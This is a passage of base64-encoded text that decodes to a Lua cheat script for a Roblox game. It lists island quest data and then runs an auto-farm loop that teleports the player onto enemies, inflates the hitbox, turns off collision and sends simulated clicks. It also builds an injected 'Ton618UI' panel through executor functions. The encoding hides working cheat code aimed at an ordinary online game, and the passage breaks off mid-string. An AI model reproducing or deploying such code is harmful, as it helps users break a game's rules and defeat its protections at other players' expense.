b3IzLm5ldygtOTUyNS41NCwgMTcyLjQ0LCA2MTM2LjcwKX0sIHtMZXZlbCA9IDIwNTAsIE1vYiA9ICJQb3NzZXNzZWQgTXVtbXkiLCBHaXZlciA9IFZlY3RvcjMubmV3KC05NTEzLjQ2LCAxNzIuNDQsIDYwNzcuMzkpLCBTcGF3biA9IFZlY3RvcjMubmV3KC05NTY0LjYwLCA2LjEzLCA2MjMyLjUzKX0gfSB9LAogICAgICAgICAgICAgICAgICAgIHsgTmFtZSA9ICJQZWFudXQgSXNsYW5kIiwgRW1vamkgPSAi8J+lnCIsIENvbG9yID0gQ29sb3IzLmZyb21SR0IoMjIyLCAxODQsIDEzNSksIE1vYnMgPSB7IHtMZXZlbCA9IDIwNzUsIE1vYiA9ICJQZWFudXQgU2NvdXQiLCBHaXZlciA9IFZlY3RvcjMubmV3KC0yMTA2Ljg5LCAzOC40NCwgLTEwMTkyLjg1KSwgU3Bhd24gPSBWZWN0b3IzLm5ldygtMTk5Mi41MiwgMTAuMDIsIC05OTc1LjEyKX0sIHtMZXZlbCA9IDIxMDAsIE1vYiA9ICJQZWFudXQgUHJlc2lkZW50IiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygtMjEwNi44OSwgMzguNDQsIC0xMDE5Mi44NSksIFNwYXduID0gVmVjdG9yMy5uZXcoLTIwODYuMTQsIDM4LjQ0LCAtMTA1NjIuNjcpfSB9IH0sCiAgICAgICAgICAgICAgICAgICAgeyBOYW1lID0gIkljZSBDcmVhbSBJc2xhbmQiLCBFbW9qaSA9ICLwn42mIiwgQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI0MCwgMjQ1KSwgTW9icyA9IHsge0xldmVsID0gMjEyNSwgTW9iID0gIkljZSBDcmVhbSBDaGVmIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygtODIxLjIyLCA2Ni4xNiwgLTEwOTY2Ljc2KSwgU3Bhd24gPSBWZWN0b3IzLm5ldygtODQ1Ljc3LCA2Ni4xNiwgLTEwOTMwLjkwKX0sIHtMZXZlbCA9IDIxNTAsIE1vYiA9ICJJY2UgQ3JlYW0gQ29tbWFuZGVyIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygtODIxLjIyLCA2Ni4xNiwgLTEwOTY2Ljc2KSwgU3Bhd24gPSBWZWN0b3IzLm5ldygtNjI0Ljk4LCA2Ni4xNiwgLTExMzE5LjgxKX0sIHtMZXZlbCA9IDIxNzUsIE1vYiA9ICJDYWtlIFF1ZWVuIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygtODIxLjIyLCA2Ni4xNiwgLTEwOTY2Ljc2KSwgU3Bhd24gPSBWZWN0b3IzLm5ldygtNzA0LjMyLCAzODEuOTEsIC0xMTAzOS45Nyl9IH0gfSwKICAgICAgICAgICAgICAgICAgICB7IE5hbWUgPSAiQ2FrZSBJc2xhbmQiLCBFbW9qaSA9ICLwn46CIiwgQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDEwNSwgMTgwKSwgTW9icyA9IHsge0xldmVsID0gMjIwMCwgTW9iID0gIkNvb2tpZSBDcmFmdGVyIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygtMjAxOS45NSwgMzguMTQsIC0xMjAyOC42OSksIFNwYXduID0gVmVjdG9yMy5uZXcoLTIzMjcuODYsIDM4LjE0LCAtMTIxMDQuODEpfSwge0xldmVsID0gMjIyNSwgTW9iID0gIkNha2UgR3VhcmQiLCBHaXZlciA9IFZlY3RvcjMubmV3KC0yMDE5Ljk1LCAzOC4xNCwgLTEyMDI4LjY5KSwgU3Bhd24gPSBWZWN0b3IzLm5ldygtMTU2Mi45MiwgNDcuMjEsIC0xMjI1NS4yMCl9LCB7TGV2ZWwgPSAyMjUwLCBNb2IgPSAiQmFraW5nIFN0YWZmIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygtMTkyNS43NywgMzguMTQsIC0xMjgzOS4wOCksIFNwYXduID0gVmVjdG9yMy5uZXcoLTE4NTAuMTUsIDM4LjE0LCAtMTMwMjguOTApfSwge0xldmVsID0gMjI3NSwgTW9iID0gIkhlYWQgQmFrZXIiLCBHaXZlciA9IFZlY3RvcjMubmV3KC0xOTI1Ljc3LCAzOC4xNCwgLTEyODM5LjA4KSwgU3Bhd24gPSBWZWN0b3IzLm5ldygtMjIzMC4wMSwgNTMuODQsIC0xMjg2Ny4wNil9IH0gfSwKICAgICAgICAgICAgICAgICAgICB7IE5hbWUgPSAiQ2hvY29sYXRlIElzbGFuZCIsIEVtb2ppID0gIvCfjasiLCBDb2xvciA9IENvbG9yMy5mcm9tUkdCKDEzOSwgNjksIDE5KSwgTW9icyA9IHsge0xldmVsID0gMjMwMCwgTW9iID0gIkNvY29hIFdhcnJpb3IiLCBHaXZlciA9IFZlY3RvcjMubmV3KDIyOS40MCwgMjUuMDcsIC0xMjIwMC44NCksIFNwYXduID0gVmVjdG9yMy5uZXcoLTM2LjkxLCAyNS4wNywgLTEyMjQyLjE2KX0sIHtMZXZlbCA9IDIzMjUsIE1vYiA9ICJDaG9jb2xhdGUgQmFyIEJhdHRsZXIiLCBHaXZlciA9IFZlY3RvcjMubmV3KDIyOS40MCwgMjUuMDcsIC0xMjIwMC44NCksIFNwYXduID0gVmVjdG9yMy5uZXcoNzE2LjI4LCAyNS4wNywgLTEyNjI1LjM1KX0sIHtMZXZlbCA9IDIzNTAsIE1vYiA9ICJTd2VldCBUaGllZiIsIEdpdmVyID0gVmVjdG9yMy5uZXcoMTQ5LjYwLCAyNS4xMywgLTEyNzczLjMyKSwgU3Bhd24gPSBWZWN0b3IzLm5ldygxLjIxLCAyNS4xMywgLTEyNjIzLjMwKX0sIHtMZXZlbCA9IDIzNzUsIE1vYiA9ICJDYW5keSBSZWJlbCIsIEdpdmVyID0gVmVjdG9yMy5uZXcoMTQ5LjYwLCAyNS4xMywgLTEyNzczLjMyKSwgU3Bhd24gPSBWZWN0b3IzLm5ldyg2NC40MSwgMjUuMTMsIC0xMjk2MS43Nyl9IH0gfSwKICAgICAgICAgICAgICAgICAgICB7IE5hbWUgPSAiQ2FuZHkgQ2FuZSBJc2xhbmQiLCBFbW9qaSA9ICLwn42sIiwgQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigyMjAsIDIwLCA2MCksIE1vYnMgPSB7IHtMZXZlbCA9IDI0MDAsIE1vYiA9ICJDYW5keSBQaXJhdGUiLCBHaXZlciA9IFZlY3RvcjMubmV3KC0xMTYwLjc5LCA2MC41MCwgLTE0NDkyLjI0KSwgU3Bhd24gPSBWZWN0b3IzLm5ldygtMTMyOC4xOCwgMzcuNTIsIC0xNDU4MS4xMil9LCB7TGV2ZWwgPSAyNDI1LCBNb2IgPSAiU25vdyBEZW1vbiIsIEdpdmVyID0gVmVjdG9yMy5uZXcoLTExNjAuNzksIDYwLjUwLCAtMTQ0OTIuMjQpLCBTcGF3biA9IFZlY3RvcjMubmV3KC04NDYuOTMsIDEzLjQ5LCAtMTQ0OTAuMDEpfSB9IH0sCiAgICAgICAgICAgICAgICAgICAgeyBOYW1lID0gIlRpa2kgT3V0cG9zdCIsIEVtb2ppID0gIvCfl78iLCBDb2xvciA9IENvbG9yMy5mcm9tUkdCKDIxMCwgMTA1LCAzMCksIE1vYnMgPSB7IHtMZXZlbCA9IDI0NTAsIE1vYiA9ICJJc2xhbmQgQm95IiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygtMTY1NDYuMTYsIDU2LjAzLCAtMTcxLjk5KSwgU3Bhd24gPSBWZWN0b3IzLm5ldygtMTY4MTAuMzQsIDIyLjAxLCAtMTkyLjIyKX0sIHtMZXZlbCA9IDI0NzUsIE1vYiA9ICJJc2xlIE91dGxhdyIsIEdpdmVyID0gVmVjdG9yMy5uZXcoLTE2NTQ2LjE2LCA1Ni4wMywgLTE3MS45OSksIFNwYXduID0gVmVjdG9yMy5uZXcoLTE2MjI1LjQ5LCAyMi4xMCwgLTIyOS4yOSl9LCB7TGV2ZWwgPSAyNTAwLCBNb2IgPSAiU3VuLUtpc3NlZCBDaGFtcGlvbiIsIEdpdmVyID0gVmVjdG9yMy5uZXcoLTE2NTM3LjI0LCA1Ni4wMywgMTA0OS43NCksIFNwYXduID0gVmVjdG9yMy5uZXcoLTE2MjU2LjIwLCAyMi4wMSwgMTA1NS4wMCl9LCB7TGV2ZWwgPSAyNTI1LCBNb2IgPSAiSXNsZSBDaGFtcGlvbiIsIEdpdmVyID0gVmVjdG9yMy5uZXcoLTE2NTM3LjI0LCA1Ni4wMywgMTA0OS43NCksIFNwYXduID0gVmVjdG9yMy5uZXcoLTE2ODA5LjM0LCAyMi4wMSwgMTA1NC40Nyl9LCB7TGV2ZWwgPSAyNTUwLCBNb2IgPSAiU2VycGVudCBIdW50ZXIiLCBHaXZlciA9IFZlY3RvcjMubmV3KC0xNjY2My42OCwgMTA1LjU4LCAxNTc1Ljg4KSwgU3Bhd24gPSBWZWN0b3IzLm5ldygtMTY0ODkuMzEsIDcxLjU4LCAxNjEwLjU0KX0sIHtMZXZlbCA9IDI1NzUsIE1vYiA9ICJTa3VsbCBTbGF5ZXIiLCBHaXZlciA9IFZlY3RvcjMubmV3KC0xNjY2My42OCwgMTA1LjU4LCAxNTc1Ljg4KSwgU3Bhd24gPSBWZWN0b3IzLm5ldygtMTY4NTIuMzgsIDcxLjU4LCAxNjMzLjk1KX0gfSB9LAogICAgICAgICAgICAgICAgICAgIHsgTmFtZSA9ICJTdWJtZXJnZWQgSXNsYW5kIiwgRW1vamkgPSAi8J+MiiIsIENvbG9yID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMTM5KSwgTW9icyA9IHsge0xldmVsID0gMjYwMCwgTW9iID0gIlNlYSBDaGFudGVyIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygxMDg4MS42NSwgLTIwODUuOTAsIDEwMDMyLjg1KSwgU3Bhd24gPSBWZWN0b3IzLm5ldygxMDYzMS43OCwgLTIwODcuNDIsIDEwMDg1LjU2KX0sIHtMZXZlbCA9IDI2MjUsIE1vYiA9ICJPY2VhbiBQcm9waGV0IiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygxMDg4MS42NSwgLTIwODUuOTAsIDEwMDMyLjg1KSwgU3Bhd24gPSBWZWN0b3IzLm5ldygxMTA1Mi4wNiwgLTIwMDcuNTgsIDEwMTY0LjU2KX0sIHtMZXZlbCA9IDI2NTAsIE1vYiA9ICJIaWdoIERpc2NpcGxlIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldyg5NjM4Ljk5LCAtMTk5Mi4xNCwgOTYxNC4wMCksIFNwYXduID0gVmVjdG9yMy5uZXcoOTg2Ny40MCwgLTE5OTMuMjksIDk3MzIuOTQpfSwge0xldmVsID0gMjY3NSwgTW9iID0gIkdyYW5kIERldm90ZWUiLCBHaXZlciA9IFZlY3RvcjMubmV3KDk2MzguOTksIC0xOTkyLjE0LCA5NjE0LjAwKSwgU3Bhd24gPSBWZWN0b3IzLm5ldyg5NTkzLjAzLCAtMTk4OC42NiwgOTk4Ni41MCl9IH0gfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICBsb2NhbCBmdW5jdGlvbiBTdG9wQXV0b0Zhcm0oKQogICAgICAgICAgICAgICAgX0cuQXV0b0Zhcm0gPSBmYWxzZTsgX0cuQ3VycmVudFF1ZXN0RGF0YSA9IG5pbAogICAgICAgICAgICAgICAgbG9jYWwgY2hhciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgaWYgY2hhciBhbmQgY2hhcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBjaGFyLkh1bWFub2lkUm9vdFBhcnQuU2l6ZSA9IFZlY3RvcjMubmV3KDIsIDIsIDEpCiAgICAgICAgICAgICAgICAgICAgY2hhci5IdW1hbm9pZFJvb3RQYXJ0LlRyYW5zcGFyZW5jeSA9IDEKICAgICAgICAgICAgICAgICAgICBjaGFyLkh1bWFub2lkUm9vdFBhcnQuQ2FuQ29sbGlkZSA9IHRydWUKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgbG9jYWwgY3gsIGN5ID0gd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuVmlld3BvcnRTaXplLlggLyAyLCB3b3Jrc3BhY2UuQ3VycmVudENhbWVyYS5WaWV3cG9ydFNpemUuWSAvIDIKICAgICAgICAgICAgICAgIFZpcnR1YWxJbnB1dE1hbmFnZXI6U2VuZE1vdXNlQnV0dG9uRXZlbnQoY3gsIGN5LCAxLCBmYWxzZSwgZ2FtZSwgMSkKICAgICAgICAgICAgICAgIFZpcnR1YWxJbnB1dE1hbmFnZXI6U2VuZE1vdXNlQnV0dG9uRXZlbnQoY3gsIGN5LCAwLCBmYWxzZSwgZ2FtZSwgMSkKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBVc2VySW5wdXRTZXJ2aWNlLklucHV0QmVnYW46Q29ubmVjdChmdW5jdGlvbihpbnB1dCwgcHJvY2Vzc2VkKQogICAgICAgICAgICAgICAgaWYgbm90IHByb2Nlc3NlZCBhbmQgU3RvcEFsbEtleSBhbmQgaW5wdXQuS2V5Q29kZSA9PSBTdG9wQWxsS2V5IHRoZW4KICAgICAgICAgICAgICAgICAgICBTdG9wQXV0b0Zhcm0oKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgIGxvY2FsIExhc3RUYXJnZXRUaW1lID0gMAogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHdoaWxlIHRhc2sud2FpdCgpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgX0cuQXV0b0Zhcm0gYW5kIF9HLkN1cnJlbnRRdWVzdERhdGEgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBjaGFyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBocnAgPSBjaGFyIGFuZCBjaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGhycCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0ID0gbmlsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgbWluRGlzdCA9IDMwMDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgXywgdiBpbiBwYWlycyh3b3Jrc3BhY2UuRW5lbWllczpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB2Lk5hbWUgPT0gX0cuQ3VycmVudFF1ZXN0RGF0YS5Nb2IgYW5kIHY6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikgYW5kIHYuSHVtYW5vaWQuSGVhbHRoID4gMCBhbmQgdjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGRpc3QgPSAoaHJwLlBvc2l0aW9uIC0gdi5IdW1hbm9pZFJvb3RQYXJ0LlBvc2l0aW9uKS5NYWduaXR1ZGUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGRpc3QgPCBtaW5EaXN0IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtaW5EaXN0ID0gZGlzdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhcmdldCA9IHYKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgYmFja3BhY2sgPSBMb2NhbFBsYXllcjpGaW5kRmlyc3RDaGlsZCgiQmFja3BhY2siKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHRvb2wgPSBjaGFyOkZpbmRGaXJzdENoaWxkV2hpY2hJc0EoIlRvb2wiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCB0b29sIGFuZCBiYWNrcGFjayB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBfLCBpdGVtIGluIHBhaXJzKGJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBpdGVtOklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGFyLkh1bWFub2lkOkVxdWlwVG9vbChpdGVtKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvb2wgPSBpdGVtCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdGFyZ2V0IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTGFzdFRhcmdldFRpbWUgPSBvcy5jbG9jaygpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhycC5TaXplID0gVmVjdG9yMy5uZXcoMjUsIDI1LCAyNSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaHJwLlRyYW5zcGFyZW5jeSA9IDEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaHJwLkNhbkNvbGxpZGUgPSBmYWxzZQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0SFJQID0gdGFyZ2V0OkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdGFyZ2V0SFJQIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhycC5DRnJhbWUgPSB0YXJnZXRIUlAuQ0ZyYW1lICogQ0ZyYW1lLm5ldygwLCAyMCwgMCkgKiBDRnJhbWUuQW5nbGVzKG1hdGgucmFkKC05MCksIDAsIDApCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGhycC5Qb3NpdGlvbiAtIHRhcmdldEhSUC5Qb3NpdGlvbikuTWFnbml0dWRlIDwgMzAgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGlzT3ZlclVJID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIG1vdXNlUG9zID0gVXNlcklucHV0U2VydmljZTpHZXRNb3VzZUxvY2F0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgb2JqZWN0cyA9IFBsYXllckd1aTpHZXRHdWlPYmplY3RzQXRQb3NpdGlvbihtb3VzZVBvcy5YLCBtb3VzZVBvcy5ZKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgXywgb2JqIGluIHBhaXJzKG9iamVjdHMpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBvYmo6SXNEZXNjZW5kYW50T2YoU2NyZWVuR3VpKSBvciAoR2FsYXh5SHViR3VpIGFuZCBvYmo6SXNEZXNjZW5kYW50T2YoR2FsYXh5SHViR3VpKSkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlzT3ZlclVJID0gdHJ1ZTsgYnJlYWsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGN4LCBjeSA9IHdvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLlZpZXdwb3J0U2l6ZS5YIC8gMiwgd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuVmlld3BvcnRTaXplLlkgLyAyCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBpc092ZXJVSSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRvb2wgdGhlbiB0b29sOkFjdGl2YXRlKCkgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFZpcnR1YWxJbnB1dE1hbmFnZXI6U2VuZE1vdXNlQnV0dG9uRXZlbnQoY3gsIGN5LCAxLCB0cnVlLCBnYW1lLCAxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBWaXJ0dWFsSW5wdXRNYW5hZ2VyOlNlbmRNb3VzZUJ1dHRvbkV2ZW50KGN4LCBjeSwgMCwgdHJ1ZSwgZ2FtZSwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVmlydHVhbElucHV0TWFuYWdlcjpTZW5kTW91c2VCdXR0b25FdmVudChjeCwgY3ksIDAsIGZhbHNlLCBnYW1lLCAxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVmlydHVhbElucHV0TWFuYWdlcjpTZW5kTW91c2VCdXR0b25FdmVudChjeCwgY3ksIDEsIGZhbHNlLCBnYW1lLCAxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBocnAuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldygwLCAwLCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgX0cuQ3VycmVudFF1ZXN0RGF0YS5TcGF3biB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBzcGF3blBvcyA9IF9HLkN1cnJlbnRRdWVzdERhdGEuU3Bhd24KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGRpc3RUb1NwYXduID0gKGhycC5Qb3NpdGlvbiAtIHNwYXduUG9zKS5NYWduaXR1ZGUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZGlzdFRvU3Bhd24gPiAxNTAgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGRpciA9IChzcGF3blBvcyAtIGhycC5Qb3NpdGlvbikuVW5pdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHN0ZXAgPSBtYXRoLm1pbihkaXN0VG9TcGF3biwgMjAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldFBvcyA9IGhycC5Qb3NpdGlvbiArIChkaXIgKiBzdGVwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHRpID0gVHdlZW5JbmZvLm5ldyhzdGVwIC8gMzUwLCBFbnVtLkVhc2luZ1N0eWxlLkxpbmVhcikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB0dyA9IFR3ZWVuU2VydmljZTpDcmVhdGUoaHJwLCB0aSwge0NGcmFtZSA9IENGcmFtZS5uZXcodGFyZ2V0UG9zKX0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHc6UGxheSgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHcuQ29tcGxldGVkOldhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBfLCB2IGluIHBhaXJzKGNoYXI6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdjpJc0EoIkJhc2VQYXJ0IikgdGhlbiB2LkNhbkNvbGxp" .. "ZGUgPSBmYWxzZSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBocnAuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldygwLCAwLCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhycC5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDAsIDAsIDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIExhc3RUYXJnZXRUaW1lID0gb3MuY2xvY2soKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgIGlmIEdhbGF4eUh1Ykd1aSB0aGVuCiAgICAgICAgICAgICAgICBHYWxheHlIdWJHdWk6RGVzdHJveSgpCiAgICAgICAgICAgICAgICBHYWxheHlIdWJHdWkgPSBuaWwKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0R3VpID0gKGdldGh1aSBhbmQgZ2V0aHVpKCkpIG9yIGdhbWU6R2V0U2VydmljZSgiQ29yZUd1aSIpCiAgICAgICAgICAgICAgICBHYWxheHlIdWJHdWkgPSBJbnN0YW5jZS5uZXcoIlNjcmVlbkd1aSIsIHRhcmdldEd1aSkKICAgICAgICAgICAgICAgIEdhbGF4eUh1Ykd1aS5OYW1lID0gIlRvbjYxOFVJIgogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsb2NhbCBNYWluID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIEdhbGF4eUh1Ykd1aSkKICAgICAgICAgICAgICAgIE1haW4uU2l6ZSA9IFVEaW0yLm5ldygwLCA0ODAsIDAsIDUyMCkKICAgICAgICAgICAgICAgIE1haW4uUG9zaXRpb24gPSBVRGltMi5uZXcoMC41LCAtMjQwLCAwLjUsIC0yNjApCiAgICAgICAgICAgICAgICBNYWluLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigxMiwgMTIsIDEyKQogICAgICAgICAgICAgICAgTWFpbi5Cb3JkZXJTaXplUGl4ZWwgPSAwCiAgICAgICAgICAgICAgICBNYWluLkFjdGl2ZSA9IHRydWUKICAgICAgICAgICAgICAgIE1haW4uRHJhZ2dhYmxlID0gdHJ1ZQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsb2NhbCBNYWluQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIsIE1haW4pIE1haW5Db3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgMikKICAgICAgICAgICAgICAgIGxvY2FsIE1haW5TdHJva2UgPSBJbnN0YW5jZS5uZXcoIlVJU3Ryb2tlIiwgTWFpbikgTWFpblN0cm9rZS5Db2xvciA9IENvbG9yMy5mcm9tUkdCKDQ1LCA0NSwgNDUpIE1haW5TdHJva2UuVGhpY2tuZXNzID0gMQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsb2Nhb